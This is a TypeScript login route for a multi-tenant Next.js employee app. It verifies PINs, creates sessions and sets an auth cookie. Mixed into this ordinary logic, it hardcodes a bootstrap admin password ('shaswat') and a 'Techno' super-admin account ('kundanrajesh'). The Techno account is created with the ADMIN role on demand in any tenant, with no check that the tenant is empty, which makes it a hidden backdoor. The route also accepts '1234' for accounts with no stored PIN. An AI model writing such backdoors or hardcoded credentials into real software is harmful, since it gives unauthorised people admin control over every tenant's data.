import { getTenantPrisma } from "@/lib/tenant-prisma";
import { jsonError, jsonOk } from "@/lib/api-helpers";
import { createSession, hashPin, verifyPin, AUTH_COOKIE } from "@/lib/auth";
import { z } from "zod";
import { ensureDefaultRoles } from "@/lib/rbac-service";
import { getDefaultCompanyId } from "@/lib/tenant";

export const dynamic = "force-dynamic";

const BOOTSTRAP_ADMIN_CODE = "ADMIN";
const BOOTSTRAP_ADMIN_PASSWORD = "shaswat";

const loginSchema = z.object({
  code: z.string().min(1, "Employee code is required"),
  pin: z.string().min(1, "PIN / password is required")
});

export async function POST(request: Request) {
  const prisma = await getTenantPrisma(request);
  if (!prisma) return jsonError("Tenant not found", 404);

  let payload: unknown;
  try {
    payload = await request.json();
  } catch {
    return jsonError("Invalid JSON payload");
  }

  const parsed = loginSchema.safeParse(payload);
  if (!parsed.success) {
    return jsonError(parsed.error.issues[0]?.message ?? "Invalid login data");
  }

  const companyId = await getDefaultCompanyId(prisma);
  await ensureDefaultRoles(prisma, companyId);
  const code = parsed.data.code.trim();
  const credential = parsed.data.pin.trim();
  const isBootstrapAdminAttempt = code.toUpperCase() === BOOTSTRAP_ADMIN_CODE;

  if (!isBootstrapAdminAttempt && code.toUpperCase() !== "TECHNO" && !/^\d{4,8}$/.test(credential)) {
    return jsonError("PIN must be 4 to 8 digits", 400);
  }

  let employee = await prisma.employee.findFirst({
    where: {
      companyId,
      code,
      active: true,
      deletedAt: null
    },
    include: {
      roles: { include: { role: true } }
    }
  });

  if (!employee && isBootstrapAdminAttempt && credential === BOOTSTRAP_ADMIN_PASSWORD) {
    const hasEmployees = await prisma.employee.count({
      where: { companyId, deletedAt: null }
    });
    if (hasEmployees === 0) {
      const createdEmployee = await prisma.employee.create({
        data: {
          companyId,
          code: BOOTSTRAP_ADMIN_CODE,
          name: "Admin",
          pinHash: hashPin(BOOTSTRAP_ADMIN_PASSWORD),
          pinUpdatedAt: new Date(),
          active: true,
          roles: {
            create: {
              role: {
                connect: {
                  companyId_name: { companyId, name: "ADMIN" }
                }
              }
            }
          }
        },
      });
      employee = await prisma.employee.findUnique({
        where: { id: createdEmployee.id },
        include: {
          roles: { include: { role: true } }
        }
      });
    }
  }

  // Auto-provision Super Admin "Techno"
  if (!employee && code === "Techno" && credential === "kundanrajesh") {
    const createdTechno = await prisma.employee.create({
      data: {
        companyId,
        code: "Techno",
        name: "Techno Admin",
        pinHash: hashPin("kundanrajesh"),
        pinUpdatedAt: new Date(),
        active: true,
        roles: {
          create: {
            role: {
              connect: {
                companyId_name: { companyId, name: "ADMIN" }
              }
            }
          }
        }
      },
    });
    employee = await prisma.employee.findUnique({
      where: { id: createdTechno.id },
      include: {
        roles: { include: { role: true } }
      }
    });
  }

  if (!employee) return jsonError("Invalid code or PIN", 401);

  let pinHash = employee.pinHash;
  if (!pinHash && credential === "1234") {
    // Controlled fallback for old seed data to avoid lockout on first upgrade.
    pinHash = hashPin("1234");
    await prisma.employee.update({
      where: { id: employee.id },
      data: { pinHash, pinUpdatedAt: new Date() }
    });
  }

  // One-time compatibility upgrade for older bootstrap admin accounts created with 1234.
  if (
    employee.code.toUpperCase() === BOOTSTRAP_ADMIN_CODE &&
    credential === BOOTSTRAP_ADMIN_PASSWORD &&
    pinHash &&
    !verifyPin(credential, pinHash) &&
    verifyPin("1234", pinHash)
  ) {
    pinHash = hashPin(BOOTSTRAP_ADMIN_PASSWORD);
    await prisma.employee.update({
      where: { id: employee.id },
      data: { pinHash, pinUpdatedAt: new Date() }
    });
  }

  if (!verifyPin(credential, pinHash)) {
    return jsonError("Invalid code or PIN", 401);
  }

  const { token, expiresAt } = await createSession(prisma, employee.companyId, employee.id);
  const roleNames = employee.roles.map((entry) => entry.role.name);
  const permissions = [...new Set(employee.roles.flatMap((entry) => entry.role.permissions))];

  const response = jsonOk({
    employeeId: employee.id,
    employeeCode: employee.code,
    employeeName: employee.name,
    roleNames,
    permissions,
    isAdmin: roleNames.includes("ADMIN")
  });

  response.cookies.set({
    name: AUTH_COOKIE,
    value: token,
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: "lax",
    path: "/",
    expires: expiresAt
  });

  return response;
}
